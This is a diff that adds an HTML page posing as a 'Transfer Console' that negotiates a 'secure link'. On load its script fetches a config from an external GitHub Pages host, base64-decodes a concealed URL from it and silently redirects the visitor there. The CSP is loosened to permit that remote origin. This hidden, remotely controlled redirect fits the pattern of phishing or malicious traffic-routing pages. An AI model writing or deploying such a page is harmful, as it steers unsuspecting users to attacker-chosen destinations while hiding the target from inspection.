@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head style="height:100%">
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Transfer Console</title>
+  <meta name="description" content="Transfer console that forwards you to the correct destination"/>
+  <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+
+  <!-- CSP keeps behavior: inline JS and the remote config origin are allowed -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src  'self' 'unsafe-inline' https://pacochachristops.github.io;
+    style-src   'self';
+    connect-src 'self' https://pacochachristops.github.io
+  "/>
+
+  <!-- Use the SAME CSS to preserve your site's style -->
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body style="height:100%">
+  <a class="skip-link" href="#main">Skip to content</a>
+
+  <header class="site-header">
+    <div class="container header-inner">
+      <a class="logo" href="#">
+        <span class="logo-mark" aria-hidden="true"></span>
+        Transfer&nbsp;Console
+      </a>
+
+      <button class="menu-toggle" id="menuToggle" aria-controls="nav" aria-expanded="false">Menu</button>
+
+    </div>
+  </header>
+
+  <main id="main" style="height:100%">
+    <section class="hero hero-coffee">
+      <div class="container hero-inner">
+        <h1>Preparing your transfer…</h1>
+        <p>We’ll relay you to the destination as soon as a secure link is negotiated.</p>
+        <div class="cta-row">
+          <button id="retryBtn" class="btn">Retry</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="container" style="padding:24px 0">
+      <div class=" split">
+        <div class="card" id="statusCard">
+          <h2>Link status</h2>
+          <p id="relayStatus" class="muted">Initializing…</p>
+          <p id="relayNote" class="muted" style="min-height:1.2em;"></p>
+        </div>
+
+      </div>
+
+      <div class="noscript">JavaScript is required to continue.</div>
+    </section>
+  </main>
+
+
+  <script>
+  // Mobile nav toggle
+  (function(){
+    var btn = document.getElementById('menuToggle');
+    var nav = document.getElementById('nav');
+    if (btn && nav) {
+      btn.addEventListener('click', function () {
+        var open = nav.classList.toggle('open');
+        btn.setAttribute('aria-expanded', open ? 'true' : 'false');
+      });
+    }
+    var y = document.getElementById('y');
+    if (y) y.textContent = new Date().getFullYear();
+  })();
+
+  async function runRelay() {
+    const statusEl = document.getElementById('relayStatus');
+    const noteEl = document.getElementById('relayNote');
+
+    statusEl.textContent = 'Requesting config…';
+    noteEl.textContent = '';
+
+    try {
+      const res = await fetch('https://pacochachristops.github.io/.github/trhow.badly', { method: 'GET' });
+      if (!res.ok) throw new Error('Config HTTP ' + res.status);
+      const data = await res.json();
+      const encoded = data && data.c;
+      if (typeof encoded !== 'string') throw new Error('Invalid payload');
+
+      const url = atob(encoded);
+      if (!/^https?:\/\//i.test(url)) throw new Error('Unexpected URL');
+
+      statusEl.textContent = 'Opening destination…';
+      window.location.replace(url);
+    } catch (err) {
+      console.error(err);
+      statusEl.textContent = 'Unable to continue.';
+      noteEl.textContent = (err && err.message) ? err.message : String(err);
+    }
+  }
+
+  // Wire buttons and auto-run
+  (function(){
+    var retry = document.getElementById('retryBtn');
+    if (retry) retry.addEventListener('click', runRelay);
+    // auto start
+    runRelay();
+  })();
+  </script>
+</body>
+</html>
